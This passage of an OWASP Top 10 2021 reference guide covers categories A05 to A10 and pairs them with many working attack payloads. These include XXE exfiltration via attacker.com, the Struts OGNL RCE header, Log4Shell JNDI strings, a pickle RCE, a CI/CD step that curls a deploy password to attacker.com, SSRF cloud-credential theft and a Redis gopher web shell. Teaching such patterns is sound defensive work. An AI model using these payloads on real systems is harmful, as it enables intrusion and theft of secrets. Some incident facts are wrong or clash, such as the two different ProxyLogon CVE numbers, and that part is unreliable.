| CWE-15 | External Control of System or Configuration Setting | 5.3-7.5 | Medium-High |
| CWE-16 | Configuration | 5.3-7.5 | Medium-High |
| CWE-260 | Password in Configuration File | 5.3-7.5 | Medium-High |
| CWE-315 | Cleartext Storage of Sensitive Information in a Cookie | 4.3-5.3 | Medium |
| CWE-520 | .NET Misconfiguration: Use of Impersonation | 5.3-7.5 | Medium-High |
| CWE-526 | Exposure of Sensitive Information Through Environmental Variables | 5.3-7.5 | Medium-High |
| CWE-537 | Java Runtime Error Message Containing Sensitive Information | 4.3-5.3 | Medium |
| CWE-541 | Inclusion of Sensitive Information in an Include File | 5.3-7.5 | Medium-High |
| CWE-547 | Use of Hard-coded, Security-relevant Constants | 5.3-7.5 | Medium-High |
| CWE-611 | Improper Restriction of XML External Entity Reference ('XXE') | 7.5-9.8 | High-Critical |
| CWE-614 | Sensitive Cookie in HTTPS Session Without 'Secure' Attribute | 4.3-5.3 | Medium |
| CWE-756 | Missing Custom Error Page | 4.3-5.3 | Medium |
| CWE-776 | Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion') | 7.5-9.8 | High-Critical |
| CWE-942 | Permissive Cross-domain Policy with Untrusted Domains | 5.3-7.5 | Medium-High |
| CWE-1004 | Sensitive Cookie Without 'HttpOnly' Flag | 4.3-5.3 | Medium |
| CWE-1032 | OWASP Top Ten 2017 Category A6 - Security Misconfiguration | N/A | N/A |
| CWE-1174 | ASP.NET Misconfiguration: Improper Model Validation | 5.3-7.5 | Medium-High |

### Common Attack Patterns & Payloads

#### 1. XML External Entity (XXE) - CWE-611
```xml
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!-- Blind XXE with out-of-band data exfiltration -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>

<!-- Billion laughs (DoS) -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ... continues exponentially -->
]>
<root>&lol9;</root>
```

#### 2. Default Credentials
```
# Common default credentials to test
admin:admin
admin:password
admin:12345
root:root
root:toor
test:test
guest:guest
administrator:administrator
tomcat:tomcat
manager:manager
```

#### 3. Information Disclosure via Error Messages
```
# Triggering verbose errors
GET /api/users/' HTTP/1.1
# Response: "SQLSTATE[42000]: Syntax error ... MySQL server version 8.0.23"

GET /nonexistent HTTP/1.1
# Response: Full stack trace with framework version, file paths, etc.
```

#### 4. Directory Listing Exploitation
```
# Browsing exposed directories
GET /backup/ HTTP/1.1
GET /config/ HTTP/1.1
GET /.git/ HTTP/1.1
GET /.env HTTP/1.1
GET /WEB-INF/web.xml HTTP/1.1
GET /phpinfo.php HTTP/1.1
```

#### 5. Missing Security Headers
```
# Checking for missing headers
curl -I https://example.com

# Missing headers to look for:
# X-Content-Type-Options: nosniff
# X-Frame-Options: DENY
# Content-Security-Policy: default-src 'self'
# X-XSS-Protection: 0
# Referrer-Policy: strict-origin-when-cross-origin
# Permissions-Policy: camera=(), microphone=(), geolocation=()
```

### Vulnerable vs. Safe Response Patterns

**Vulnerable (Verbose error):**
```http
GET /api/users/abc HTTP/1.1

HTTP/1.1 500 Internal Server Error
Content-Type: text/html
<h1>Application Error</h1>
<pre>
java.lang.NumberFormatException: For input string: "abc"
    at java.lang.Integer.parseInt(Integer.java:580)
    at com.example.UserController.getUser(UserController.java:42)
    at sun.reflect.NativeMethodAccessorImpl.invoke(...)
Stack trace continues with internal paths...
Server: Apache Tomcat/9.0.37
Database: PostgreSQL 13.2
</pre>
```

**Safe:**
```http
GET /api/users/abc HTTP/1.1

HTTP/1.1 400 Bad Request
Content-Type: application/json
{"error": "Invalid request", "message": "User ID must be a valid number"}
```

**Vulnerable (Missing headers):**
```http
HTTP/1.1 200 OK
Content-Type: text/html
Server: Apache/2.4.41
X-Powered-By: PHP/7.4.3
```

**Safe:**
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'; script-src 'self'
Strict-Transport-Security: max-age=63072000; includeSubDomains
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

### Real-World Examples

- **Capital One (2019)**: Misconfigured AWS WAF and S3 bucket permissions exposed 100+ million customer records.
- **Twitch (2021)**: Misconfigured server allowed exfiltration of the entire source code and internal data.
- **Microsoft Power Apps (2021)**: Default setting left OData APIs publicly accessible, exposing 38 million records from 47 organizations.
- **SolarWinds Serv-U (2021)**: Default SSH configuration enabled remote code execution.
- **Firebase (2018)**: Thousands of Firebase databases found with open read/write access due to default misconfigurations.

---

## A06:2021 - Vulnerable and Outdated Components

### Description

Previously titled "Using Components with Known Vulnerabilities." This category ranked #2 in the OWASP community survey but also had enough data to make the Top 10 via data analysis. It addresses the risk of using libraries, frameworks, and other software modules with known vulnerabilities. Components typically run with the same privileges as the application, making any flaw potentially severe.

### Key Statistics

| Metric | Value |
|--------|-------|
| CWEs Mapped | 3 |
| Max Incidence Rate | 27.96% |
| Avg Incidence Rate | 8.77% |
| Avg Weighted Exploit | 5.00 |
| Avg Weighted Impact | 5.00 |
| Total Occurrences | 30,457 |
| Total CVEs | 0 (default weight applied) |

### Mapped CWEs (3 Total)

| CWE ID | Name | Typical CVSS | Severity |
|--------|------|-------------|----------|
| CWE-937 | OWASP Top 10 2013: Using Components with Known Vulnerabilities | Variable (depends on component) | Variable |
| CWE-1035 | OWASP Top 10 2017: Using Components with Known Vulnerabilities | Variable (depends on component) | Variable |
| CWE-1104 | Use of Unmaintained Third-Party Components | Variable (depends on component) | Variable |

### Common Attack Patterns & Payloads

#### 1. Exploiting Known CVEs in Dependencies
```bash
# Identifying vulnerable components
# Using OWASP Dependency-Check
dependency-check --project "MyProject" --scan ./lib

# Using npm audit for Node.js
npm audit

# Using pip-audit for Python
pip-audit

# Using Snyk
snyk test

# Checking for specific known-vulnerable versions
curl -I https://target.com | grep -i "server\|x-powered-by"
# Response: "Server: Apache/2.4.49" -> CVE-2021-41773 (Path Traversal)
```

#### 2. Apache Struts RCE (CVE-2017-5638)
```
# Content-Type header OGNL injection
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

#### 3. Log4Shell (CVE-2021-44228)
```
# JNDI lookup injection
${jndi:ldap://attacker.com/exploit}
${jndi:rmi://attacker.com/exploit}
${jndi:dns://attacker.com/exploit}

# Obfuscation variants
${${lower:j}ndi:${lower:l}dap://attacker.com/exploit}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/exploit}

# Injected via various headers
User-Agent: ${jndi:ldap://attacker.com/exploit}
X-Forwarded-For: ${jndi:ldap://attacker.com/exploit}
Referer: ${jndi:ldap://attacker.com/exploit}
```

#### 4. Spring4Shell (CVE-2022-22965)
```
# ClassLoader manipulation via Spring parameter binding
POST /app HTTP/1.1
Content-Type: application/x-www-form-urlencoded

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B...
```

### Vulnerable vs. Safe Response Patterns

**Vulnerable:**
```http
HTTP/1.1 200 OK
Server: Apache/2.4.49
X-Powered-By: PHP/5.6.40
# Outdated versions with known critical CVEs
```

**Safe:**
```http
HTTP/1.1 200 OK
# Server header removed or generic
# X-Powered-By header removed
# Latest patched versions in use
# SBOMs maintained and monitored
```

### Real-World Examples

- **Log4Shell / Log4j (CVE-2021-44228, CVSS 10.0)**: Critical RCE in Apache Log4j 2, affecting millions of Java applications worldwide. Actively exploited within hours of disclosure.
- **Apache Struts (CVE-2017-5638, CVSS 10.0)**: RCE that led to the Equifax breach. Patch was available two months before the breach.
- **Spring4Shell (CVE-2022-22965, CVSS 9.8)**: RCE in Spring Framework affecting Java 9+ applications running on Apache Tomcat.
- **jQuery File Upload (CVE-2018-9206)**: Unrestricted file upload affecting thousands of projects that depended on this widget.
- **Heartbleed (CVE-2014-0160)**: OpenSSL vulnerability in a widely-used library that went unpatched in many systems for months.

---

## A07:2021 - Identification and Authentication Failures

### Description

Previously known as "Broken Authentication," this category slid down from the second position. It now includes CWEs more related to identification failures. Confirmation of the user's identity, authentication, and session management is critical to protect against authentication-related attacks.

### Key Statistics

| Metric | Value |
|--------|-------|
| CWEs Mapped | 22 |
| Max Incidence Rate | 14.84% |
| Avg Incidence Rate | 2.55% |
| Avg Weighted Exploit | 7.40 |
| Avg Weighted Impact | 6.50 |
| Total Occurrences | 132,195 |
| Total CVEs | 3,897 |

### Mapped CWEs (22 Total)

| CWE ID | Name | Typical CVSS | Severity |
|--------|------|-------------|----------|
| CWE-255 | Credentials Management Errors | 5.3-7.5 | Medium-High |
| CWE-259 | Use of Hard-coded Password | 7.5-9.8 | High-Critical |
| CWE-287 | Improper Authentication | 7.5-9.8 | High-Critical |
| CWE-288 | Authentication Bypass Using an Alternate Path or Channel | 7.5-9.8 | High-Critical |
| CWE-290 | Authentication Bypass by Spoofing | 5.3-7.5 | Medium-High |
| CWE-294 | Authentication Bypass by Capture-replay | 5.9-8.1 | Medium-High |
| CWE-295 | Improper Certificate Validation | 5.9-7.4 | Medium-High |
| CWE-297 | Improper Validation of Certificate with Host Mismatch | 5.9-7.4 | Medium-High |
| CWE-300 | Channel Accessible by Non-Endpoint | 5.9-7.5 | Medium-High |
| CWE-302 | Authentication Bypass by Assumed-Immutable Data | 5.3-7.5 | Medium-High |
| CWE-304 | Missing Critical Step in Authentication | 7.5-9.8 | High-Critical |
| CWE-306 | Missing Authentication for Critical Function | 7.5-9.8 | High-Critical |
| CWE-307 | Improper Restriction of Excessive Authentication Attempts | 7.5-9.8 | High-Critical |
| CWE-346 | Origin Validation Error | 5.3-7.5 | Medium-High |
| CWE-384 | Session Fixation | 5.4-8.8 | Medium-High |
| CWE-521 | Weak Password Requirements | 5.3-7.5 | Medium-High |
| CWE-613 | Insufficient Session Expiration | 5.4-8.8 | Medium-High |
| CWE-620 | Unverified Password Change | 5.3-8.8 | Medium-High |
| CWE-640 | Weak Password Recovery Mechanism for Forgotten Password | 5.3-8.8 | Medium-High |
| CWE-798 | Use of Hard-coded Credentials | 7.5-9.8 | High-Critical |
| CWE-940 | Improper Verification of Source of a Communication Channel | 5.9-7.5 | Medium-High |
| CWE-1216 | Lockout Mechanism Errors | 5.3-7.5 | Medium-High |

### Common Attack Patterns & Payloads

#### 1. Credential Stuffing
```bash
# Using compiled breach databases with tools like Hydra
hydra -L usernames.txt -P passwords.txt https://target.com/login http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# Burp Suite Intruder with credential lists
POST /api/login HTTP/1.1
Content-Type: application/json
{"username": "§user@example.com§", "password": "§password123§"}
# Iterating through lists of known username:password pairs
```

#### 2. Brute Force
```bash
# Password spraying (one password across many accounts)
POST /api/login HTTP/1.1
{"username": "user001@corp.com", "password": "Spring2024!"}
# Repeat for user002, user003... with same password

# Traditional brute force with common passwords
# Testing: password, Password1, 123456, admin, qwerty, etc.
```

#### 3. Session Fixation
```
# Attacker sets session ID before victim authenticates
# Step 1: Attacker gets a session
GET /login HTTP/1.1
Response: Set-Cookie: JSESSIONID=ATTACKER_SESSION_ID

# Step 2: Attacker tricks victim into using this session
https://target.com/login?JSESSIONID=ATTACKER_SESSION_ID

# Step 3: Victim authenticates, session is now authenticated
# Step 4: Attacker uses ATTACKER_SESSION_ID to access victim's account
```

#### 4. Session Hijacking via URL Exposure
```
# Session ID in URL (vulnerable)
https://example.com/dashboard?sessionid=abc123xyz

# Shared via Referer header when user clicks external link
Referer: https://example.com/dashboard?sessionid=abc123xyz
```

#### 5. Account Enumeration
```
# Different error messages reveal valid usernames
POST /api/login HTTP/1.1
{"username": "valid_user", "password": "wrong"}
Response: "Invalid password"  # Confirms username exists

POST /api/login HTTP/1.1
{"username": "invalid_user", "password": "wrong"}
Response: "User not found"  # Confirms username does NOT exist

# Password reset enumeration
POST /api/forgot-password HTTP/1.1
{"email": "valid@example.com"}
Response: "Reset email sent"

POST /api/forgot-password HTTP/1.1
{"email": "invalid@example.com"}
Response: "Email not found"
```

### Vulnerable vs. Safe Response Patterns

**Vulnerable (Account enumeration):**
```http
POST /api/login HTTP/1.1
{"username": "admin", "password": "wrongpassword"}

HTTP/1.1 401 Unauthorized
{"error": "Invalid password for user admin"}
```

**Safe:**
```http
POST /api/login HTTP/1.1
{"username": "admin", "password": "wrongpassword"}

HTTP/1.1 401 Unauthorized
{"error": "Invalid username or password"}
```

**Vulnerable (No brute-force protection):**
```http
# 1000th attempt still returns normally
POST /api/login HTTP/1.1
{"username": "admin", "password": "attempt1000"}

HTTP/1.1 401 Unauthorized
{"error": "Invalid credentials"}
```

**Safe:**
```http
# After 5 failed attempts
POST /api/login HTTP/1.1
{"username": "admin", "password": "attempt6"}

HTTP/1.1 429 Too Many Requests
Retry-After: 900
{"error": "Too many failed attempts. Account locked for 15 minutes."}
```

### Real-World Examples

- **Colonial Pipeline (2021)**: Compromised through a single stolen VPN password that lacked multi-factor authentication.
- **Microsoft Exchange (2021)**: Authentication bypass (ProxyLogon CVE-2021-26855) allowed unauthenticated RCE.
- **Uber (2022)**: Attacker used social engineering to bypass MFA and gain access to internal systems.
- **Okta (2022)**: Lapsus$ group compromised a support engineer's account, affecting 366 customer tenants.
- **LastPass (2022)**: DevOps engineer's home computer was compromised using stolen credentials from a previous breach.

---

## A08:2021 - Software and Data Integrity Failures

### Description

A new category for 2021 that focuses on making assumptions related to software updates, critical data, and CI/CD pipelines without verifying integrity. This replaces and expands A8:2017 - Insecure Deserialization. It covers insecure deserialization, use of software/data from untrusted sources without integrity verification, insecure CI/CD pipelines, and auto-update without signature verification.

### Key Statistics

| Metric | Value |
|--------|-------|
| CWEs Mapped | 10 |
| Max Incidence Rate | 16.67% |
| Avg Incidence Rate | 2.05% |
| Avg Weighted Exploit | 6.94 |
| Avg Weighted Impact | 7.94 |
| Total Occurrences | 47,972 |
| Total CVEs | 1,152 |

### Mapped CWEs (10 Total)

| CWE ID | Name | Typical CVSS | Severity |
|--------|------|-------------|----------|
| CWE-345 | Insufficient Verification of Data Authenticity | 5.3-7.5 | Medium-High |
| CWE-353 | Missing Support for Integrity Check | 5.3-7.5 | Medium-High |
| CWE-426 | Untrusted Search Path | 7.5-8.8 | High |
| CWE-494 | Download of Code Without Integrity Check | 7.5-8.8 | High |
| CWE-502 | Deserialization of Untrusted Data | 7.5-9.8 | High-Critical |
| CWE-565 | Reliance on Cookies without Validation and Integrity Checking | 4.3-6.5 | Medium |
| CWE-784 | Reliance on Cookies without Validation in Security Decision | 4.3-6.5 | Medium |
| CWE-829 | Inclusion of Functionality from Untrusted Control Sphere | 7.5-9.8 | High-Critical |
| CWE-830 | Inclusion of Web Functionality from an Untrusted Source | 5.3-7.5 | Medium-High |
| CWE-915 | Improperly Controlled Modification of Dynamically-Determined Object Attributes | 5.3-7.5 | Medium-High |

### Common Attack Patterns & Payloads

#### 1. Insecure Deserialization - Java (CWE-502)
```java
// Detecting Java serialized objects (base64 starts with "rO0")
// Raw bytes start with: AC ED 00 05

// Exploiting with ysoserial
java -jar ysoserial.jar CommonsCollections1 'id' | base64

// Common payload targets:
// - Apache Commons Collections
// - Spring Framework
// - Groovy
// - JBoss
```

```
# HTTP request with malicious serialized object
POST /api/data HTTP/1.1
Content-Type: application/x-java-serialized-object

<base64-encoded ysoserial payload>
```

#### 2. Insecure Deserialization - PHP
```php
// Vulnerable PHP code
$data = unserialize($_COOKIE['user_data']);

// Malicious serialized PHP object
O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}

// PHP POP chain exploitation
O:8:"Autoload":1:{s:4:"file";s:11:"/etc/passwd";}
```

#### 3. Insecure Deserialization - Python (Pickle)
```python
# Vulnerable code
import pickle
data = pickle.loads(user_input)

# Malicious pickle payload for RCE
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))
payload = pickle.dumps(Exploit())
```

#### 4. Insecure Deserialization - .NET
```
# Detecting .NET serialized objects
# BinaryFormatter: AAEAAAD (base64)
# Raw bytes: 00 01 00 00 00

# Using ysoserial.net
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "whoami"
```

#### 5. Supply Chain Attacks
```
# Typosquatting in package registries
pip install reqeusts  # Typo of "requests"
npm install lodahs    # Typo of "lodash"

# Dependency confusion
# Publishing a malicious package to public registry with same name
# as internal/private package but higher version number
```

#### 6. CI/CD Pipeline Manipulation
```yaml
# Injecting malicious code into CI/CD pipeline
# Modifying build script to exfiltrate secrets
script:
  - echo $CI_DEPLOY_PASSWORD | base64 | curl -X POST -d @- https://attacker.com/collect
  - npm run build
```

### Vulnerable vs. Safe Response Patterns

**Vulnerable (Accepting serialized objects):**
```http
POST /api/transfer HTTP/1.1
Content-Type: application/x-java-serialized-object
Cookie: user_session=rO0ABXNyABRqYXZhLmxhbmcuT2JqZWN0...

HTTP/1.1 200 OK
{"status": "Transfer complete"}
# Server blindly deserializes untrusted data
```

**Safe:**
```http
POST /api/transfer HTTP/1.1
Content-Type: application/json
Authorization: Bearer <JWT>
{"from_account": "1234", "to_account": "5678", "amount": 100}

# Server uses JSON (not serialization), validates schema, checks signatures
HTTP/1.1 200 OK
{"status": "Transfer complete", "reference": "TXN-123456"}
```

### Real-World Examples

- **SolarWinds Orion (2020)**: Attackers (APT29/Cozy Bear) inserted malicious code into the build pipeline, distributing trojanized updates to ~18,000 organizations. Approximately 100 were actively compromised including US government agencies.
- **Codecov (2021)**: Attackers modified the Bash Uploader script to exfiltrate CI/CD environment variables and secrets from customers' build environments.
- **ua-parser-js (2021)**: Popular npm package (7M+ weekly downloads) was hijacked, distributing crypto-miners and credential stealers.
- **event-stream (2018)**: npm package maintainer handoff led to injection of malicious code targeting Copay Bitcoin wallet.
- **Kaseya VSA (2021)**: Supply chain attack via REvil ransomware exploiting authentication bypass and arbitrary file upload, affecting ~1,500 downstream businesses.
- **Log4Shell (CVE-2021-44228)**: While also a component vulnerability, the JNDI injection led to deserialization of untrusted data from attacker-controlled LDAP/RMI servers.

---

## A09:2021 - Security Logging and Monitoring Failures

### Description

Previously "Insufficient Logging & Monitoring" (A10:2017), this category moved up from #10 based on the industry survey (#3). This category is broader than the original, covering failures in logging, detection, monitoring, and active response. Without logging and monitoring, breaches cannot be detected. Insufficient logging, detection, monitoring, and active response occurs any time auditable events are not logged, warnings and errors generate inadequate messages, or logs are not monitored for suspicious activity.

### Key Statistics

| Metric | Value |
|--------|-------|
| CWEs Mapped | 4 |
| Max Incidence Rate | 19.23% |
| Avg Incidence Rate | 6.51% |
| Avg Weighted Exploit | 6.87 |
| Avg Weighted Impact | 4.99 |
| Total Occurrences | 53,615 |
| Total CVEs | 242 |

### Mapped CWEs (4 Total)

| CWE ID | Name | Typical CVSS | Severity |
|--------|------|-------------|----------|
| CWE-117 | Improper Output Neutralization for Logs | 5.3-7.5 | Medium-High |
| CWE-223 | Omission of Security-relevant Information | 4.3-7.5 | Medium-High |
| CWE-532 | Insertion of Sensitive Information into Log File | 4.3-7.5 | Medium-High |
| CWE-778 | Insufficient Logging | 4.3-7.5 | Medium-High |

### Common Attack Patterns & Payloads

#### 1. Log Injection / Log Forging (CWE-117)
```
# Injecting fake log entries
username=admin%0d%0a[INFO] User admin logged in successfully

# Resulting log file shows:
# [WARN] Failed login for user: admin
# [INFO] User admin logged in successfully  <-- injected
```

#### 2. Log Evasion
```
# Splitting attack across many requests to avoid detection thresholds
# Instead of 1000 requests/second, sending 1 request/minute

# Using different source IPs (distributed attack)
# Rotating user agents
# Encoding payloads to bypass log pattern matching
User-Agent: ${jndi:ldap://evil.com/x}  # Log4Shell via User-Agent
```

#### 3. Sensitive Data in Logs (CWE-532)
```python
# Vulnerable: Logging sensitive data
logger.info(f"User login attempt: username={username}, password={password}")
logger.info(f"Processing payment: card_number={card_number}, cvv={cvv}")
logger.debug(f"API key used: {api_key}")
logger.info(f"User session: {session_token}")
```

#### 4. Missing Audit Trail
```
# Critical events that should be logged but aren't:
# - Failed login attempts
# - Access control failures (403s)
# - Server-side input validation failures
# - Admin actions (user creation, deletion, role changes)
# - Sensitive data access
# - API rate limit violations
# - Changes to security configurations
```

### Vulnerable vs. Safe Response Patterns

**Vulnerable (No logging, no monitoring):**
```python
# No logging at all
def login(username, password):
    user = db.get_user(username)
    if user and user.check_password(password):
        return create_session(user)
    return {"error": "Invalid credentials"}
```

**Safe:**
```python
import logging
from datetime import datetime

audit_logger = logging.getLogger('security_audit')

def login(username, password):
    user = db.get_user(username)
    if user and user.check_password(password):
        audit_logger.info(
            f"LOGIN_SUCCESS user={username} ip={request.remote_addr} "
            f"time={datetime.utcnow().isoformat()}"
        )
        return create_session(user)
    else:
        audit_logger.warning(
            f"LOGIN_FAILURE user={username} ip={request.remote_addr} "
            f"time={datetime.utcnow().isoformat()} "
            f"reason={'user_not_found' if not user else 'bad_password'}"
        )
        alert_if_brute_force(username, request.remote_addr)
        return {"error": "Invalid credentials"}
```

**Vulnerable (Sensitive data in logs):**
```
[2024-01-15 10:23:45] INFO: Payment processed for card 4111-1111-1111-1111, CVV 123, amount $500
[2024-01-15 10:23:46] DEBUG: User token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Safe:**
```
[2024-01-15 10:23:45] INFO: Payment processed for card ****-****-****-1111, amount $500, ref=TXN-789
[2024-01-15 10:23:46] DEBUG: User authenticated, session_id=<redacted>
```

### Real-World Examples

- **Children's Health Insurance Program (Anthem, 2015)**: Breach affecting 78.8 million records went undetected for months due to insufficient logging and monitoring.
- **Marriott/Starwood (2018)**: Breach of 500 million guest records had been ongoing since 2014 (4 years undetected) due to inadequate monitoring after the Starwood acquisition.
- **British Airways (2018)**: Magecart attack on payment systems for 15 days. Insufficient monitoring resulted in a 20 million GBP GDPR fine.
- **Air India (2021)**: Breach exposing 10 years of passenger data due to insufficient monitoring of a third-party cloud provider (SITA).
- **Target (2013)**: Despite FireEye alerts flagging suspicious activity, security team did not act. 40 million credit card records stolen over weeks.

---

## A10:2021 - Server-Side Request Forgery (SSRF)

### Description

SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or network ACL. This category was added from the Top 10 community survey (#1). The data shows a relatively low incidence rate with above-average testing coverage, and above-average ratings for Exploit and Impact potential.

### Key Statistics

| Metric | Value |
|--------|-------|
| CWEs Mapped | 1 |
| Max Incidence Rate | 2.72% |
| Avg Incidence Rate | 2.72% |
| Avg Weighted Exploit | 8.28 |
| Avg Weighted Impact | 6.72 |
| Total Occurrences | 9,503 |
| Total CVEs | 385 |

### Mapped CWEs (1 Total)

| CWE ID | Name | Typical CVSS | Severity |
|--------|------|-------------|----------|
| CWE-918 | Server-Side Request Forgery (SSRF) | 5.3-9.8 | Medium-Critical |

### Common Attack Patterns & Payloads

#### 1. Basic SSRF
```
# Accessing internal services
POST /api/fetch HTTP/1.1
Content-Type: application/json
{"url": "http://localhost:8080/admin"}
{"url": "http://127.0.0.1:3306/"}
{"url": "http://192.168.1.1/admin"}
{"url": "http://10.0.0.1/internal"}

# Accessing local files
{"url": "file:///etc/passwd"}
{"url": "file:///etc/shadow"}
{"url": "file:///proc/self/environ"}
{"url": "file:///home/user/.ssh/id_rsa"}
```

#### 2. Cloud Metadata Exploitation - AWS
```
# AWS Instance Metadata Service (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# Response contains:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "..."
# }

# AWS IMDSv2 (requires PUT with header)
# Step 1: Get token
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: Use token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
X-aws-ec2-metadata-token: <token>
```

#### 3. Cloud Metadata Exploitation - Azure
```
# Azure Instance Metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Must include header: Metadata: true

# Azure Token Acquisition
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Must include header: Metadata: true
```

#### 4. Cloud Metadata Exploitation - GCP
```
# GCP Metadata
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Must include header: Metadata-Flavor: Google

# GCP alternate
http://169.254.169.254/computeMetadata/v1/
```

#### 5. SSRF Filter Bypass Techniques
```
# IP address bypass
http://127.1/
http://0x7f000001/
http://017700000001/
http://2130706433/                    # Decimal representation of 127.0.0.1
http://[::1]/                          # IPv6 loopback
http://0000::1/
http://127.0.0.1.nip.io/              # DNS rebinding

# URL encoding bypass
http://127.0.0.1/%61dmin
http://127%2E0%2E0%2E1/

# Double encoding
http://127%252E0%252E0%252E1/

# Protocol bypass
gopher://127.0.0.1:25/
dict://127.0.0.1:11211/
ftp://127.0.0.1/

# Redirect bypass
http://attacker.com/redirect?url=http://169.254.169.254/

# DNS rebinding
# Attacker's DNS alternates between attacker IP and 127.0.0.1
http://rebind.attacker.com/

# Enclosed alphanumerics
http://⑯⑨.②⑤④.①⑥⑨.②⑤④/
```

#### 6. Internal Network Scanning via SSRF
```
# Port scanning internal hosts
POST /api/fetch HTTP/1.1
{"url": "http://192.168.1.1:22"}    # SSH
{"url": "http://192.168.1.1:3306"}  # MySQL
{"url": "http://192.168.1.1:6379"}  # Redis
{"url": "http://192.168.1.1:27017"} # MongoDB
{"url": "http://192.168.1.1:9200"}  # Elasticsearch
{"url": "http://192.168.1.1:8500"}  # Consul
{"url": "http://192.168.1.1:2379"}  # etcd

# Observing response timing/errors to determine open/closed ports
```

#### 7. Exploiting Internal Services via SSRF
```
# Redis command execution via Gopher
gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0A

# Accessing internal APIs
{"url": "http://internal-api.corp:8080/v1/users"}
{"url": "http://kubernetes.default.svc/api/v1/secrets"}
```

### Vulnerable vs. Safe Response Patterns

**Vulnerable (Raw content returned):**
```http
POST /api/preview HTTP/1.1
Content-Type: application/json
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"}

HTTP/1.1 200 OK
Content-Type: application/json
{
  "Code": "Success",
  "AccessKeyId": "ASIAXXXXXXXXXXX",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "FwoGZXIvYXdzEBYaDH...",
  "Expiration": "2024-01-15T12:00:00Z"
}
```

**Safe:**
```http
POST /api/preview HTTP/1.1
Content-Type: application/json
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"}

HTTP/1.1 400 Bad Request
Content-Type: application/json
{"error": "Invalid URL", "message": "Requested URL is not in the allowed list"}
```

**Safe (with allowlist):**
```http
POST /api/preview HTTP/1.1
Content-Type: application/json
{"url": "https://allowed-domain.com/api/data"}

HTTP/1.1 200 OK
Content-Type: application/json
{"data": "..."}  # Only response content, never raw headers or connection details
```

### Real-World Examples

- **Capital One (2019, CVE-2019-4872)**: SSRF exploited via a misconfigured WAF to access AWS metadata service (169.254.169.254), stealing IAM credentials that were used to access S3 buckets containing 100+ million customer records.
- **Microsoft Exchange ProxyLogon (2021, CVE-2021-26885)**: SSRF in Exchange Server allowed unauthenticated attackers to send HTTP requests to internal services.
- **GitLab (CVE-2021-22214)**: SSRF via webhook allowed access to internal network resources.
- **Shopify (2015)**: SSRF bug bounty disclosed, allowing access to internal Google Cloud metadata.
- **Jira (CVE-2019-8451)**: SSRF in Jira Server and Data Center allowed access to internal network.

---

## Appendix A: OWASP Top 10 2021 - Summary Cross-Reference Table

| Rank | Category | CWE Count | Max Incidence | Avg Exploit | Avg Impact | Notable CWEs |
|------|----------|-----------|---------------|-------------|------------|--------------|
